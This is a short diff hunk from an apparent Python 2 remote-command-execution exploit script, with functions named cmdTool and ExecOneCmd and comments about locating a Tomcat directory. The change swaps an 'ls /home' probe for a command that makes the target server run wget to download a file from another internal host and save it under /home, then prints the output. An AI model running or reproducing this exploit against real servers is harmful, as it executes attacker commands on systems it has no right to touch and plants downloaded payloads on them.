@@ -65,8 +65,8 @@ def cmdTool(exp_url):
 # res = cmdTool(url)
 # 寻找文件夹
 # file = ExecOneCmd(url, "touch /home/sas.test")
-file = ExecOneCmd(url,"ls /home")
-# print file
+file = ExecOneCmd(url,"wget http://172.22.209.33:8014/api/download -O /home/nuonuo.swm")
+print file
 
 # re_tomfile = re.compile(r'.+?tomcat')
 # tomfile = re_tomfile.search(file)
